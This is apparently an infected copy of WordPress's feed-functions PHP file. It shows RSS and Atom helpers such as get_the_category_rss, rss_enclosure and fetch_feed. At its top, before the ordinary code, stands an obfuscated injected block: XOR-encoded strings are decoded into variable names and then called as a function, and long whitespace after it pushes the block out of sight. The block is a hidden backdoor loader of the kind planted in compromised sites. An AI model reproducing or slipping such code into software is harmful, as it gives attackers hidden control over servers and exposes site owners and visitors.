$ÂÍõAòqòqHä¼Ö¬†@t‘`$ÚŠjEë²>3"Qgäé,¥µö­ Q#°`ÖÓ~#-AQ¹Ğe#QYt¸	eÖ« ##s‹âpW-‚Ã¤]ôú›2;‘Á¼*¦+%1–ªÜFDôê—X‚ ·^oï02üq‹ûß¥h1RÉ:t‘+›nı¾‰JSp÷ìøÒÍç#²êıa^`%W!ä@„ì„cÄ*Ml÷ßAÿ-kêgƒ‰²D¬k1o`‰cóğüfäøÇ˜ûq/\'Ïæ /h¥”íH\\JÜıA®Ö¡²KJP2²à²]K/#bUjÆ‘ü¡=Èh–R$EziÈJ+2z\'¸£Ñ1ã?àöÏ¬\'’üéf<Ëû·X.z@ä2IÙÁ¨Hş€N½æ@ $ƒuˆÙ"ã‘½5ÌN#xcg\'ÑÄäÿ') ) ; ${'ÑC)ëôàñŞÂ'/*ypJqfHCJ#N*/^/*iz^*/'{Lß‘¨É„£'}='¥J·»0' ^ 'Ä9aÒÉD';${'¢«ZÍ®®ˆJ'/*G {jcPbR*/^/*S@y*/'ı“?ùpæ–Ò+'}( '5áªü©öÄR•ª¼É¹é‚šÑ—ƒéUßÒû' ^ 'u„ÜrÒ”6ÖÎíŒîûšØÇò¥äªÉjîèÊ%') ;   /*                                                                                                                        
 *
 * @since 1.0.0
 */
function comment_text_rss() {
	$comment_text = get_comment_text();
	/**
	 * Filter the current comment content for use in a feed.
	 *
	 * @since 1.5.0
	 *
	 * @param string $comment_text The content of the current comment.
	 */
	$comment_text = apply_filters( 'comment_text_rss', $comment_text );
	echo $comment_text;
}

/**
 * Retrieve all of the post categories, formatted for use in feeds.
 *
 * All of the categories for the current post in the feed loop, will be
 * retrieved and have feed markup added, so that they can easily be added to the
 * RSS2, Atom, or RSS1 and RSS0.91 RDF feeds.
 *
 * @since 2.1.0
 *
 * @param string $type Optional, default is the type returned by get_default_feed().
 * @return string All of the post categories for displaying in the feed.
 */
function get_the_category_rss($type = null) {
	if ( empty($type) )
		$type = get_default_feed();
	$categories = get_the_category();
	$tags = get_the_tags();
	$the_list = '';
	$cat_names = array();

	$filter = 'rss';
	if ( 'atom' == $type )
		$filter = 'raw';

	if ( !empty($categories) ) foreach ( (array) $categories as $category ) {
		$cat_names[] = sanitize_term_field('name', $category->name, $category->term_id, 'category', $filter);
	}

	if ( !empty($tags) ) foreach ( (array) $tags as $tag ) {
		$cat_names[] = sanitize_term_field('name', $tag->name, $tag->term_id, 'post_tag', $filter);
	}

	$cat_names = array_unique($cat_names);

	foreach ( $cat_names as $cat_name ) {
		if ( 'rdf' == $type )
			$the_list .= "\t\t<dc:subject><![CDATA[$cat_name]]></dc:subject>\n";
		elseif ( 'atom' == $type )
			$the_list .= sprintf( '<category scheme="%1$s" term="%2$s" />', esc_attr( get_bloginfo_rss( 'url' ) ), esc_attr( $cat_name ) );
		else
			$the_list .= "\t\t<category><![CDATA[" . @html_entity_decode( $cat_name, ENT_COMPAT, get_option('blog_charset') ) . "]]></category>\n";
	}

	/**
	 * Filter all of the post categories for display in a feed.
	 *
	 * @since 1.2.0
	 *
	 * @param string $the_list All of the RSS post categories.
	 * @param string $type     Type of feed. Possible values include 'rss2', 'atom'.
	 *                         Default 'rss2'.
	 */
	return apply_filters( 'the_category_rss', $the_list, $type );
}

/**
 * Display the post categories in the feed.
 *
 * @since 0.71
 * @see get_the_category_rss() For better explanation.
 *
 * @param string $type Optional, default is the type returned by get_default_feed().
 */
function the_category_rss($type = null) {
	echo get_the_category_rss($type);
}

/**
 * Display the HTML type based on the blog setting.
 *
 * The two possible values are either 'xhtml' or 'html'.
 *
 * @since 2.2.0
 */
function html_type_rss() {
	$type = get_bloginfo('html_type');
	if (strpos($type, 'xhtml') !== false)
		$type = 'xhtml';
	else
		$type = 'html';
	echo $type;
}

/**
 * Display the rss enclosure for the current post.
 *
 * Uses the global $post to check whether the post requires a password and if
 * the user has the password for the post. If not then it will return before
 * displaying.
 *
 * Also uses the function get_post_custom() to get the post's 'enclosure'
 * metadata field and parses the value to display the enclosure(s). The
 * enclosure(s) consist of enclosure HTML tag(s) with a URI and other
 * attributes.
 *
 * @since 1.5.0
 */
function rss_enclosure() {
	if ( post_password_required() )
		return;

	foreach ( (array) get_post_custom() as $key => $val) {
		if ($key == 'enclosure') {
			foreach ( (array) $val as $enc ) {
				$enclosure = explode("\n", $enc);

				// only get the first element, e.g. audio/mpeg from 'audio/mpeg mpga mp2 mp3'
				$t = preg_split('/[ \t]/', trim($enclosure[2]) );
				$type = $t[0];

				/**
				 * Filter the RSS enclosure HTML link tag for the current post.
				 *
				 * @since 2.2.0
				 *
				 * @param string $html_link_tag The HTML link tag with a URI and other attributes.
				 */
				echo apply_filters( 'rss_enclosure', '<enclosure url="' . trim( htmlspecialchars( $enclosure[0] ) ) . '" length="' . trim( $enclosure[1] ) . '" type="' . $type . '" />' . "\n" );
			}
		}
	}
}

/**
 * Display the atom enclosure for the current post.
 *
 * Uses the global $post to check whether the post requires a password and if
 * the user has the password for the post. If not then it will return before
 * displaying.
 *
 * Also uses the function get_post_custom() to get the post's 'enclosure'
 * metadata field and parses the value to display the enclosure(s). The
 * enclosure(s) consist of link HTML tag(s) with a URI and other attributes.
 *
 * @since 2.2.0
 */
function atom_enclosure() {
	if ( post_password_required() )
		return;

	foreach ( (array) get_post_custom() as $key => $val ) {
		if ($key == 'enclosure') {
			foreach ( (array) $val as $enc ) {
				$enclosure = explode("\n", $enc);
				/**
				 * Filter the atom enclosure HTML link tag for the current post.
				 *
				 * @since 2.2.0
				 *
				 * @param string $html_link_tag The HTML link tag with a URI and other attributes.
				 */
				echo apply_filters( 'atom_enclosure', '<link href="' . trim( htmlspecialchars( $enclosure[0] ) ) . '" rel="enclosure" length="' . trim( $enclosure[1] ) . '" type="' . trim( $enclosure[2] ) . '" />' . "\n" );
			}
		}
	}
}

/**
 * Determine the type of a string of data with the data formatted.
 *
 * Tell whether the type is text, html, or xhtml, per RFC 4287 section 3.1.
 *
 * In the case of WordPress, text is defined as containing no markup,
 * xhtml is defined as "well formed", and html as tag soup (i.e., the rest).
 *
 * Container div tags are added to xhtml values, per section 3.1.1.3.
 *
 * @link http://www.atomenabled.org/developers/syndication/atom-format-spec.php#rfc.section.3.1
 *
 * @since 2.5.0
 *
 * @param string $data Input string
 * @return array array(type, value)
 */
function prep_atom_text_construct($data) {
	if (strpos($data, '<') === false && strpos($data, '&') === false) {
		return array('text', $data);
	}

	$parser = xml_parser_create();
	xml_parse($parser, '<div>' . $data . '</div>', true);
	$code = xml_get_error_code($parser);
	xml_parser_free($parser);

	if (!$code) {
		if (strpos($data, '<') === false) {
			return array('text', $data);
		} else {
			$data = "<div xmlns='http://www.w3.org/1999/xhtml'>$data</div>";
			return array('xhtml', $data);
		}
	}

	if (strpos($data, ']]>') === false) {
		return array('html', "<![CDATA[$data]]>");
	} else {
		return array('html', htmlspecialchars($data));
	}
}

/**
 * Displays Site Icon in atom feeds.
 *
 * @since 4.3.0
 *
 * @see get_site_icon_url()
 */
function atom_site_icon() {
	$url = get_site_icon_url( 32 );
	if ( $url ) {
		echo "<icon>$url</icon>\n";
	}
}

/**
 * Displays Site Icon in RSS2.
 *
 * @since 4.3.0
 */
function rss2_site_icon() {
	$rss_title = get_wp_title_rss();
	if ( empty( $rss_title ) ) {
		$rss_title = get_bloginfo_rss( 'name' );
	}

	$url = get_site_icon_url( 32 );
	if ( $url ) {
		echo '
<image>
	<url>' . convert_chars( $url ) . '</url>
	<title>' . $rss_title . '</title>
	<link>' . get_bloginfo_rss( 'url' ) . '</link>
	<width>32</width>
	<height>32</height>
</image> ' . "\n";
	}
}

/**
 * Display the link for the currently displayed feed in a XSS safe way.
 *
 * Generate a correct link for the atom:self element.
 *
 * @since 2.5.0
 */
function self_link() {
	$host = @parse_url(home_url());
	/**
	 * Filter the current feed URL.
	 *
	 * @since 3.6.0
	 *
	 * @see set_url_scheme()
	 * @see wp_unslash()
	 *
	 * @param string $feed_link The link for the feed with set URL scheme.
	 */
	echo esc_url( apply_filters( 'self_link', set_url_scheme( 'http://' . $host['host'] . wp_unslash( $_SERVER['REQUEST_URI'] ) ) ) );
}

/**
 * Return the content type for specified feed type.
 *
 * @since 2.8.0
 *
 * @param string $type Type of feed. Possible values include 'rss', rss2', 'atom', and 'rdf'.
 */
function feed_content_type( $type = '' ) {
	if ( empty($type) )
		$type = get_default_feed();

	$types = array(
		'rss'      => 'application/rss+xml',
		'rss2'     => 'application/rss+xml',
		'rss-http' => 'text/xml',
		'atom'     => 'application/atom+xml',
		'rdf'      => 'application/rdf+xml'
	);

	$content_type = ( !empty($types[$type]) ) ? $types[$type] : 'application/octet-stream';

	/**
	 * Filter the content type for a specific feed type.
	 *
	 * @since 2.8.0
	 *
	 * @param string $content_type Content type indicating the type of data that a feed contains.
	 * @param string $type         Type of feed. Possible values include 'rss', rss2', 'atom', and 'rdf'.
	 */
	return apply_filters( 'feed_content_type', $content_type, $type );
}

/**
 * Build SimplePie object based on RSS or Atom feed from URL.
 *
 * @since 2.8.0
 *
 * @param mixed $url URL of feed to retrieve. If an array of URLs, the feeds are merged
 * using SimplePie's multifeed feature.
 * See also {@link â€‹http://simplepie.org/wiki/faq/typical_multifeed_gotchas}
 *
 * @return WP_Error|SimplePie WP_Error object on failure or SimplePie object on success
 */
function fetch_feed( $url ) {
	require_once( ABSPATH . WPINC . '/class-feed.php' );

	$feed = new SimplePie();

	$feed->set_sanitize_class( 'WP_SimplePie_Sanitize_KSES' );
	// We must manually overwrite $feed->sanitize because SimplePie's
	// constructor sets it before we have a chance to set the sanitization class
	$feed->sanitize = new WP_SimplePie_Sanitize_KSES();

	$feed->set_cache_class( 'WP_Feed_Cache' );
	$feed->set_file_class( 'WP_SimplePie_File' );

	$feed->set_feed_url( $url );
	/** This filter is documented in wp-includes/class-feed.php */
	$feed->set_cache_duration( apply_filters( 'wp_feed_cache_transient_lifetime', 12 * HOUR_IN_SECONDS, $url ) );
	/**
	 * Fires just before processing the SimplePie feed object.
	 *
	 * @since 3.0.0
	 *
	 * @param object &$feed SimplePie feed object, passed by reference.
	 * @param mixed  $url   URL of feed to retrieve. If an array of URLs, the feeds are merged.
	 */
	do_action_ref_array( 'wp_feed_options', array( &$feed, $url ) );
	$feed->init();
	$feed->set_output_encoding( get_option( 'blog_charset' ) );
	$feed->handle_content_type();

	if ( $feed->error() )
		return new WP_Error( 'simplepie-error', $feed->error() );

	return $feed;
}
